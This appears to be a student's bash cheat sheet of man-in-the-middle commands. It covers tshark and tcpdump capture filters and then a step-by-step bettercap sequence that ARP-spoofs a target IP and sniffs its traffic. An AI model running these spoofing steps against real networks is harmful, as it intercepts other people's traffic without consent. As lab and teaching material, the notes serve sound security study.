#!/bin/bash
# ============================================================
# MITM Attack - ARP Spoofing & Packet Capturing Commands
# Project by: Musthahsina T
# ============================================================

# ─────────────────────────────────────────────
# TSHARK
# ─────────────────────────────────────────────

# Install tshark
sudo apt install tshark

# Capture filter by host
tshark -f "host 192.168.1.1"

# Capture filter by port
tshark -f "tcp port 80"

# Capture filter by network
tshark -f "net 192.168.1.0/24"

# Capture only HTTP traffic (port 80) on wlan0
sudo tshark -i wlan0 -f "tcp port 80"

# Display only DNS packets
sudo tshark -i wlan0 -Y dns

# Display only HTTP packets
sudo tshark -i wlan0 -Y http

# ─────────────────────────────────────────────
# TCPDUMP
# ─────────────────────────────────────────────

# List all available network interfaces
sudo tcpdump -D

# Capture and display 50 packets on wlan0
sudo tcpdump -i wlan0 -c 50

# Host filtering - capture traffic to/from tesla.com
sudo tcpdump host tesla.com

# Port filtering - capture DNS traffic (port 53), no name resolution
sudo tcpdump -i wlan0 port 53 -n

# ─────────────────────────────────────────────
# ETTERCAP (ARP Spoofing - GUI Steps via CLI)
# ─────────────────────────────────────────────

# Launch Ettercap in GUI mode
sudo ettercap -G

# ─────────────────────────────────────────────
# BETTERCAP (ARP Spoofing)
# ─────────────────────────────────────────────

# Launch bettercap on wlan0
sudo bettercap -iface wlan0

# Inside bettercap interactive session:

# Step 1: View help
# help

# Step 2: View ARP spoof module help
# help arp.spoof

# Step 3: Enable full-duplex ARP spoofing
# set arp.spoof.fullduplex true

# Step 4: Set target IP address
# set arp.spoof.targets 192.168.1.62

# Step 5: Start ARP spoofing
# arp.spoof on

# Step 6: Start network sniffing
# net.sniff on

# Step 7: Show captured hosts (victim MAC + IP)
# net.show
